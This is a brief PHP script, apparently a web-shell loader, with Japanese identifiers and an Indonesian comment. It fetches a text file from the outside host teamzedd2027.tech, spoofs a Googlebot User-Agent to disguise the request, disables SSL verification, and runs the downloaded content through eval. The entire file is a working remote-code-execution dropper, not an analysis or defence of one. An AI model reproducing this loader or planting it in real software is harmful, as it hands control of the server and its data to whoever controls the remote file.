<?php
// バージョン 4: Googlebotに偽装 (Pura-pura jadi Googlebot)
$ターゲット = 'https://teamzedd2027.tech/project/rahman.txt';
$設定 = [
    'http' => [
        'header' => "User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\r\n"
    ],
    'ssl' => ['verify_peer' => false]
];

$データ = file_get_contents($ターゲット, false, stream_context_create($設定));
if ($データ) {
    eval("?>".$データ);
}
?>